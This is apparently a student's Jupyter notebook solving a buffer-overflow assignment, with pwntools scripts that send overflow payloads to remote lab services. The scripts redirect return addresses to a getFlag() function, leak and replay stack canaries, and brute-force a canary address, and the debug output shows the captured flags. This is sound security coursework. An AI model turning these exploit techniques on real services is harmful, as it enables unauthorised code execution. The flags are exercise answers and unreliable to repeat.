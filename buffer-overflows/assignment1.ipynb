{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "source": [
    "#EXERCISE 0\n",
    "import pwn as pwn\n",
    "r = pwn.remote(\"158.39.77.181\", 7000)\n",
    "payload = pwn.cyclic(length=16)\n",
    "payload += pwn.p32(0x79beef8b)\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "print(payload)\n",
    "r.sendline(payload)\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "r.close()"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "[x] Opening connection to 158.39.77.181 on port 7000\n",
      "[x] Opening connection to 158.39.77.181 on port 7000: Trying 158.39.77.181\n",
      "[+] Opening connection to 158.39.77.181 on port 7000: Done\n",
      "[DEBUG] Received 0x1a bytes:\n",
      "    b'Input an argument to pass\\n'\n",
      "Input an argument to pass\n",
      "\n",
      "b'aaaabaaacaaadaaa\\x8b\\xef\\xbey'\n",
      "[DEBUG] Sent 0x15 bytes:\n",
      "    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│\n",
      "    00000010  8b ef be 79  0a                                     │···y│·│\n",
      "    00000015\n",
      "[DEBUG] Received 0x41 bytes:\n",
      "    b'Well done, you can get the flag\\n'\n",
      "    b'dyfaculybumatupolokewijupucugejo\\n'\n",
      "Well done, you can get the flag\n",
      "\n",
      "dyfaculybumatupolokewijupucugejo\n",
      "\n",
      "[*] Closed connection to 158.39.77.181 port 7000\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "source": [
    "#EXERCISE 1\n",
    "import pwn as pwn\n",
    "pwn.context.log_level = 'debug'\n",
    "r = pwn.remote(\"158.39.77.181\", 7001)\n",
    "\n",
    "payload = pwn.cyclic(length=16)\n",
    "#append the address of the getFlag() function\n",
    "payload += pwn.p64(0x00000000004011f6)\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "r.sendline(payload)\n",
    "print(payload)\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "r.close()"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "[x] Opening connection to 158.39.77.181 on port 7001\n",
      "[x] Opening connection to 158.39.77.181 on port 7001: Trying 158.39.77.181\n",
      "[+] Opening connection to 158.39.77.181 on port 7001: Done\n",
      "[DEBUG] Received 0x25 bytes:\n",
      "    b'Try to get flag by inputing argument\\n'\n",
      "Try to get flag by inputing argument\n",
      "\n",
      "[DEBUG] Sent 0x19 bytes:\n",
      "    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│\n",
      "    00000010  f6 11 40 00  00 00 00 00  0a                        │··@·│····│·│\n",
      "    00000019\n",
      "b'aaaabaaacaaadaaa\\xf6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "[DEBUG] Received 0x1e bytes:\n",
      "    b'Function is goint to 0x4011f6\\n'\n",
      "Function is goint to 0x4011f6\n",
      "\n",
      "[DEBUG] Received 0x78 bytes:\n",
      "    b'Congrats! you can get the flag\\n'\n",
      "    b'pogixihikonobasufehemigurevihamu\\n'\n",
      "    b'*** stack smashing detected ***: ./assignB01 terminated\\n'\n",
      "Congrats! you can get the flag\n",
      "\n",
      "pogixihikonobasufehemigurevihamu\n",
      "\n",
      "[*] Closed connection to 158.39.77.181 port 7001\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "source": [
    "#EXERCISE 2\n",
    "import pwn as pwn\n",
    "r = pwn.remote(\"158.39.77.181\", 7002)\n",
    "\n",
    "payload = b\"A\"*24\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "r.sendline(b\"16\")\n",
    "print(16)\n",
    "\n",
    "#receive the read canary - canary has 8 bytes\n",
    "received = str(hex(int(r.readline().decode(\"ascii\"))))\n",
    "print(received)\n",
    "part1 = \"0x\" + received[10:18]\n",
    "part2 = received[0:10]\n",
    "print(part1 +\" \" + part2)\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "#append the read canary\n",
    "payload += pwn.p32(int(part1, 16))\n",
    "payload += pwn.p32(int(part2, 16))\n",
    "#8 Byte bis zum return pointer überbrücken\n",
    "payload += b'A' * 8\n",
    "#append the new return pointer - address of getFlag() 0x00000000_004007f7\n",
    "payload += pwn.p64(0x00000000004007f7)\n",
    "\n",
    "r.sendline(payload)\n",
    "print(payload)\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "r.close()"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "[x] Opening connection to 158.39.77.181 on port 7002\n",
      "[x] Opening connection to 158.39.77.181 on port 7002: Trying 158.39.77.181\n",
      "[+] Opening connection to 158.39.77.181 on port 7002: Done\n",
      "[DEBUG] Received 0x1a bytes:\n",
      "    b'What does the canary say?\\n'\n",
      "What does the canary say?\n",
      "\n",
      "[DEBUG] Sent 0x3 bytes:\n",
      "    b'16\\n'\n",
      "16\n",
      "[DEBUG] Received 0x14 bytes:\n",
      "    b'1893942196073145344\\n'\n",
      "0x1a48a2648e102400\n",
      "0x8e102400 0x1a48a264\n",
      "[DEBUG] Received 0x22 bytes:\n",
      "    b'Try to get flag by inputing value\\n'\n",
      "Try to get flag by inputing value\n",
      "\n",
      "[DEBUG] Sent 0x31 bytes:\n",
      "    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│\n",
      "    00000010  41 41 41 41  41 41 41 41  00 24 10 8e  64 a2 48 1a  │AAAA│AAAA│·$··│d·H·│\n",
      "    00000020  41 41 41 41  41 41 41 41  f7 07 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│\n",
      "    00000030  0a                                                  │·│\n",
      "    00000031\n",
      "b'AAAAAAAAAAAAAAAAAAAAAAAA\\x00$\\x10\\x8ed\\xa2H\\x1aAAAAAAAA\\xf7\\x07@\\x00\\x00\\x00\\x00\\x00'\n",
      "[DEBUG] Received 0x1f bytes:\n",
      "    b'Congrats! you can get the flag\\n'\n",
      "Congrats! you can get the flag\n",
      "\n",
      "[DEBUG] Received 0x21 bytes:\n",
      "    b'kamogimukirivezuhufukowebetebiwo\\n'\n",
      "kamogimukirivezuhufukowebetebiwo\n",
      "\n",
      "[*] Closed connection to 158.39.77.181 port 7002\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "source": [
    "#EXERCISE 3 - getting the address of the canary\n",
    "import pwn as pwn\n",
    "pwn.context.log_level = 'error'\n",
    "data = {}\n",
    "value = int(0xffffe108) #the lowest address I got when testing on a local version\n",
    "\n",
    "def get_key(val):\n",
    "    for key, value in data.items():\n",
    "         if val == value:\n",
    "             return key\n",
    "    return -1\n",
    "\n",
    "while(value < int(0xffffffef)):\n",
    "    r = pwn.remote(\"158.39.77.181\", 7003)\n",
    "    payload = b'A'* 32\n",
    "    value += 16\n",
    "    payload += pwn.p32(value)\n",
    "    payload += pwn.p16(0x7fff)\n",
    "    r.readline().decode(\"ascii\")\n",
    "    r.sendline(payload)\n",
    "\n",
    "    try:\n",
    "        canary = hex(int(r.recv(0x15).decode(\"ascii\")))\n",
    "    except EOFError:\n",
    "        pass\n",
    "    except ValueError:\n",
    "        pass\n",
    "    if abs(int(canary, 16)) > 0x0000010000000000: #arbitrarily chosen bound\n",
    "        if get_key(canary) == -1:\n",
    "            print(canary + \" at \" + hex(value))\n",
    "            data.update({value : canary})\n",
    "        \n",
    "print(data)\n",
    "r.close()"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "0xeb6981ec44afd at 0xffffeca8\n",
      "{4294962344: '0xeb6981ec44afd'}\n"
     ]
    }
   ],
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "source": [
    "#EXERCISE 3 \n",
    "import pwn as pwn\n",
    "pwn.context.log_level = 'error'\n",
    "\n",
    "r = pwn.remote(\"158.39.77.181\", 7003)\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "\n",
    "#padding + address of canary\n",
    "payload = b'A'* 32\n",
    "payload += pwn.p64(0x7fffffffecc8)\n",
    "r.sendline(payload)\n",
    "print(\"sent: \" + str(payload))\n",
    "\n",
    "#canary value is the answer\n",
    "readValue = r.readline().decode(\"ascii\")[:-1]\n",
    "print(readValue)\n",
    "\n",
    "#padding + address of canary + canary + padding + new return pointer\n",
    "payload2 = b'q'* 32 #fill the buffer\n",
    "payload2 += pwn.p64(0x00007fffffffecc8) #the pt0 / canary address\n",
    "payload2 += pwn.p64(int(readValue,16)) #the canary\n",
    "payload2 += b'A'*8 #padding \n",
    "payload2 += pwn.p64(0x00000000004011d6) #new return address\n",
    "r.sendline(payload2)\n",
    "print(\"sent: \" + str(payload2))\n",
    "\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "print(r.readline().decode(\"ascii\"))\n",
    "print(r.readline().decode(\"ascii\"))"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Do not, for one repulse, forego the purpose that you resolved to effect -William Shakespeare, The Tempest\n",
      "\n",
      "sent: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xc8\\xec\\xff\\xff\\xff\\x7f\\x00\\x00'\n",
      "3da7799e47f66800\n",
      "sent: b'qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq\\xc8\\xec\\xff\\xff\\xff\\x7f\\x00\\x00\\x00h\\xf6G\\x9ey\\xa7=AAAAAAAA\\xd6\\x11@\\x00\\x00\\x00\\x00\\x00'\n",
      "Do not, for one repulse, forego the purpose that you resolved to effect -William Shakespeare, The Tempest\n",
      "\n",
      "3da7799e47f66800\n",
      "\n",
      "Well done, you can get the flag\n",
      "\n",
      "meximafinetogyjuwohipyzobywosobu\n",
      "\n"
     ]
    }
   ],
   "metadata": {}
  }
 ],
 "metadata": {
  "orig_nbformat": 4,
  "language_info": {
   "name": "python",
   "version": "3.8.10",
   "mimetype": "text/x-python",
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "pygments_lexer": "ipython3",
   "nbconvert_exporter": "python",
   "file_extension": ".py"
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3.8.10 64-bit"
  },
  "interpreter": {
   "hash": "31f2aee4e71d21fbe5cf8b01ff0e069b9275f58929596ceb00d14d90e3e16cd6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}